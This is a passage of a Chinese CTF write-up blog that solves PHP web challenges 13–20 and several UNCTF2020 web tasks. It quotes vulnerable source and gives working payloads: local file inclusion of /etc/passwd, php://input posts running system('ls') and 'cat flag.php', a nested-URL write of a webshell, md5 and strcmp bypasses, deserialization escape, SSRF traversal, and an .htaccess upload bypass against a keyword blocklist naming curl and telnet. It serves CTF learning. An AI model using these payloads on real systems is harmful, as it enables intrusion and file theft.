<p>var_dump($a)可考虑命令执行，构造<code>?hello=);var_dump(file(&quot;flag.php&quot;));//</code><br>var_dump($a); —-&gt;<code> var_dump();var_dump(file(&quot;flag.php&quot;));//);</code></p>
</blockquote>
<h1 id="challenge-13"><a href="#challenge-13" class="headerlink" title="challenge 13"></a>challenge 13</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;  <span class="comment">//120秒之后销毁会话</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);  <span class="comment">//range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组</span></span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].<span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)]; <span class="comment">//生成两个随机字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>]==(<span class="variable">$value</span>[<span class="number">0</span>].<span class="variable">$value</span>[<span class="number">1</span>]) &amp;&amp; substr(md5(<span class="variable">$value</span>),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125; <span class="comment">//当whoami=value时，num+1，whoami=$str_rands；==弱类型比较</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;  <span class="comment">//循环10次输出flag</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>120秒直接手工传参，传十次就得到flag了</p>
<p>也可以写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://XXX&#x27;</span></span><br><span class="line">a=requests.Session()</span><br><span class="line">b=a.get(url+<span class="string">&#x27;?value[]=ea&#x27;</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    b=a.get(url+&#x27;?value[]=&#x27;+ b[0:2]).text  //这里的b[0:2]是获取读取的源代码的前两个字符,因为手工传一次`?value[]=ea`后可以发现，新的随机数在源码最前面  </span><br><span class="line">    print(b)</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="challenge-14"><a href="#challenge-14" class="headerlink" title="challenge 14"></a>challenge 14</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">PHP logo</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在linux文件/etc/passwd中包含用户名、用户[ID]、用户群组[ID]、用户描述信息、家目录以及登录shell<br>?path=../../../../etc/passwd<br>allow_url_include打开着,使用php://input协议，post传递参数<?php system("ls");?>，可以发现flag.php</p>
<p>直接使用<code>php://filter/read=convert.base64-encode/resource=flag.php</code>读取文件内容<br>也可以继续使用php://input协议，post传递参数<?php system("cat flag.php");?></p>
</blockquote>
<h1 id="challenge-15"><a href="#challenge-15" class="headerlink" title="challenge 15"></a>challenge 15</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;        <span class="comment">#存在GET且不为空</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];    <span class="comment">#拼接路径</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>) &gt; <span class="number">-1</span>)&#123;    <span class="comment"># $path中不含..</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SYCwaf!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$url</span>,<span class="string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="number">0</span>)&#123;          <span class="comment">#$file变量中 http://127.0.0.1/ 存 在且为开头</span></span><br><span class="line">    file_put_contents(<span class="variable">$path</span>, file_get_contents(<span class="variable">$url</span>));   <span class="comment">#读取$url内容并写入$path</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;console.log(<span class="subst">$path</span> update successed!)&quot;</span>;   <span class="comment"># 在控制台输出$path update successed!</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello.Geeker&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我拿phpinfo做了下测试，之前以为</p>
<p><a href="http://xxx/?path=shell.php&amp;file=http://127.0.0.1/?path=">http://XXX/?path=shell.php&amp;file=http://127.0.0.1/?path=</a><?php+phpinfo();?>&amp;file=<a href="http://127.0.0.1/">http://127.0.0.1/</a></p>
<p>里面的</p>
<p>file=<a href="http://127.0.0.1/?path=">http://127.0.0.1/?path=</a><?php+phpinfo();?>&amp;file=<a href="http://127.0.0.1/%EF%BC%88%E8%BF%99%E9%87%8Curl%E9%9C%80%E8%A6%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%AE%BF%E9%97%AE%E4%BA%86%E4%B8%A4%E6%AC%A1%EF%BC%89">http://127.0.0.1/（这里url需要二次编码，因为访问了两次）</a></p>
<p>写入到shell.php文件里面后就和题目的源码独立出来了，后来改改参数测试了下发现并没有，然后一切问题迎刃而解。</p>
<p>这个题目要的就是把shell.php构造为一个webshell，通过用URL请求这个webshell的页面并写入到path文件</p>
<p>URL二层嵌套，这两层都需要符合题目要求，即<code>$path中不含..  $file变量中 http://127.0.0.1/ 存在                                                       且为开头</code>所以很容易就可以构造出可以绕过的payload</p>
<h1 id="challenge-16"><a href="#challenge-16" class="headerlink" title="challenge 16"></a>challenge 16</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]))    </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]))   <span class="comment"># POST方式提交submit和hihi</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]) === <span class="literal">FALSE</span>)  <span class="comment">#hihi里只存在字母和数字</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;have fun:)&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]) &lt; <span class="number">11</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>] &gt; <span class="number">999999999</span>) <span class="comment"># hihi长度小   于11且数值大于999999999</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>], <span class="string">&#x27;#HONG#&#x27;</span>) !== <span class="literal">FALSE</span>)    <span class="comment">#hihi中存在#HONG#</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>])) &#123;                  <span class="comment">#hihi不为数组</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;nonono&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;nonono&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;sorry&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">submit</span>=<span class="number">1</span>&amp;hihi=<span class="number">9</span>e<span class="number">9</span>%<span class="number">00</span>#HONG#</span><br></pre></td></tr></table></figure>




<h1 id="challenge-17"><a href="#challenge-17" class="headerlink" title="challenge 17"></a>challenge 17</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$smile</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;        <span class="comment"># 存在^_^</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;\.&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;     <span class="comment"># 不存在\.</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;%&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;         <span class="comment"># 不存在%</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;[0-9]&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;      <span class="comment"># 不存在数字</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;http&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]) ) <span class="variable">$smile</span> = <span class="number">0</span>;      <span class="comment"># 不存在http</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;https&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]) ) <span class="variable">$smile</span> = <span class="number">0</span>;     </span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;ftp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;telnet&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;  <span class="comment">#url ?后面不存在_</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$smile</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@file_exists (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;   <span class="comment"># 不存在file_exists寻找的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$smile</span> = @file_get_contents (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span> === <span class="string">&quot;(●&#x27;◡&#x27;●)&quot;</span>) <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p><a href="http://www.360doc.com/content/18/0203/09/52553745_727370869.shtml">$_SERVER[‘QUERY_STRING’]</a></p>
<blockquote>
<p>搜索引擎会忽略下划线的存在<br>当<code>.</code>或<code>[]</code>之类的符号作为参数的key的时候，会被PHP改写为<code>_</code><br>file_exists对data指向的内容判断为不存在<br>$_SERVER[‘QUERY_STRING’]：QUERY_STRING就是URL后接的参数，如<a href="http://www.baidu.com/?a=B%EF%BC%8Ca=B%E5%B0%B1%E6%98%AFQUERY_STRING">www.baidu.com/?a=B，a=B就是QUERY_STRING</a></p>
<p>“data”类型的Url格式，目的对于一些“小”的数据，可以在网页中直接嵌入，而不是从外部文件载入。</p>
</blockquote>
<h1 id="challenge-18"><a href="#challenge-18" class="headerlink" title="challenge 18"></a>challenge 18</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))             <span class="comment">#存在login</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))               <span class="comment">#存在user</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(@strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],<span class="variable">$USER</span>))<span class="comment">//USER是被隐藏的复杂用户名     #比较大小</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;user错误！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))     <span class="comment">#存在name和password</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] )     <span class="comment">#弱等于</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;账号密码不能一致！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))     <span class="comment">#md5强等于</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(is_numeric(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]!==<span class="string">&#x27;72&#x27;</span> &amp;&amp; !preg_match(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="number">72</span>)</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;flag&#123;xxxxxxxxxxxxx&#125;&quot;</span>);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;ID错误2！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;ID错误1！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;账号密码错误！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><code>72.</code>     是数字字符串<br>MD5不能处理数组，处理任意数组返回值都相同<br>MD5每一个以0E开头的哈希值都解释为0<br>strcmp函数用于比较两个字符串并根据比较结果返回整数,可改成数据类型绕过</p>
</blockquote>
<h1 id="challenge-19"><a href="#challenge-19" class="headerlink" title="challenge 19"></a>challenge 19</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sss&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="string">&#x27;challenge19.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sss&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$sss</span>)==<span class="number">666</span>)&#123;            <span class="comment">#长度等于666</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[^0-6]/&quot;</span>,<span class="variable">$sss</span>))&#123;     <span class="comment">#只能存在0-6的数字 </span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$sss=&#x27;</span>.<span class="variable">$sss</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$sss</span>!==<span class="string">&#x27;0x666&#x27;</span>)&#123;      <span class="comment">#这里的0x是十六进制的意思</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$sss</span>==<span class="string">&#x27;0x666&#x27;</span>)&#123;     <span class="comment"># $sss 的值需要等于数值 0×666，而又不能等于字符串’0×666′，</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要创建一个长度为 666 ,只包含0 — 6的数字，数值上等于 0×666且不等于字符串 ’0×666′的参数,十六进制666转换可以发现八进制时在数字0-6之间</p>
<blockquote>
<p>1、十六进制：0x开头<br>2、八进制：0开头<br>3、二进制：0b开头</p>
</blockquote>
<h1 id="challenge-20"><a href="#challenge-20" class="headerlink" title="challenge 20"></a>challenge 20</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))</span><br><span class="line">	<span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;xxoo&#x27;</span>];              <span class="comment">#$user 是一个数组, [0 =&gt; ‘admin’, 1 =&gt; ‘xxoo’]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="variable">$user</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>][<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>➜  ~  php -r “var_dump([1=&gt;0]==[1=&gt;0]);”<br>bool(true)</p>
</blockquote>
<blockquote>
<p>➜  ~  php -r  “var_dump([1=&gt;0]===[1=&gt;0]);”<br>bool(true)</p>
</blockquote>
<blockquote>
<p>➜  ~  php -r “var_dump([1=&gt;0]==[2=&gt;0]);”<br>bool(false)</p>
</blockquote>
<blockquote>
<p>➜  ~  php -r “var_dump([1=&gt;0]===[2=&gt;0]);”<br>bool(false)</p>
</blockquote>
<blockquote>
<p>➜  ~  php -r “var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);”  #键名为 0 与0x100000000` 数组相等<br>bool(true)</p>
</blockquote>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>UNCTF2020</title>
    <url>/2020/11/14/UNCTF2020/</url>
    <content><![CDATA[<p>第一次拿到名次的比赛，做出了27题<a id="more"></a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyeval"><a href="#easyeval" class="headerlink" title="easyeval"></a>easyeval</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?a=include<span class="variable">$_GET</span>[<span class="string">&quot;npfs&quot;</span>]?&gt;&amp;npfs=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210405213339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解码即可</p>
<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p>反序列化字符串逃逸</p>
<p><img src="https://img.npfs06.top/20210405213349.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:<span class="number">92</span>:<span class="string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;easy&quot;</span>;&#125;&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1</span>;&#125;&quot;;</span><br></pre></td></tr></table></figure>


<p><strong>payload:</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;easy&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><p>考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p>
<ul>
<li>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href="https://www.runoob.com/php/filter-validate-url.html" target="_blank">https://www.runoob.com/php/filter-validate-url.html</a></li>
</ul>
<p>题目中要求url中存在 unctf.com<br>我们可以构造类似 <code>unctf.com/../../../ </code> 这样的url，又因为我们需要查看flag文件</p>
<p>最终payload为 <code>url=unctf.com/../../../../../flag</code></p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>我们需要构造序列化后的username 和 password,但是我们不知道账号密码是什么（题目给的那个是迷惑你的）</p>
<p>bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true</p>
<p><img src="https://img.npfs06.top/20210405213358.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h2><p>emmm和 De1CTF2020的check in没啥区别似乎</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="symbol">*</span><span class="symbol">*</span>perl|<span class="string">pyth</span>|<span class="string">ph</span>|<span class="string">auto</span>|<span class="string">curl</span>|<span class="string">base</span>|<span class="string">\</span>|<span class="string">&gt;</span>|<span class="string">rm</span>|<span class="string">ryby</span>|<span class="string">openssl</span>|<span class="string">war</span>|<span class="string">lua</span>|<span class="string">msf</span>|<span class="string">xter</span>|<span class="string">telnet in contents!**</span></span><br></pre></td></tr></table></figure>


<p>过滤了这些东西</p>
<p>经过测试发现我们上传的图片文件不能解析，因此我们可以上传一个<code>.htaccess</code>，添加其他后缀名解析为<code>.php</code>文件。如：<code>AddType application/x-httpd-php shell.ppt</code>。不过由于<code>php</code>字符串的过滤我们上传的文件不能包含<code>php</code>，因此我们上传的<code>.httacess</code>文件中的<code>php</code>可以用换行符绕过，对于上传了的<code>shell.ppt</code>文件，如果该php开启了短标签我们可以用短标签<code>&lt;?=</code>来代替<code>&lt;?php</code></p>
<p><img src="https://img.npfs06.top/20210405213409.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
